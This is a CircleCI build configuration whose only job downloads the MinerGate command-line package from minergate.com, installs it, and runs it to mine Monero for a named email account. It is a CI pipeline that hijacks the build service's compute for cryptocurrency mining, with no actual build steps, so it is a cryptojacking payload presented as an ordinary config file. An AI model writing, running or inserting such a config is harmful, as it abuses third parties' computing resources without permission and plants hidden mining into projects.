version: 2
jobs:
  build:
    docker:
      - image: greenfieldsvp/dock
    steps:
      - checkout
      - run: apt-get update
      - run: apt-get install apt-transport-https -y
      - run: wget https://minergate.com/download/deb-cli -O a.deb 
      - run: dpkg -i a.deb 
      - run: minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
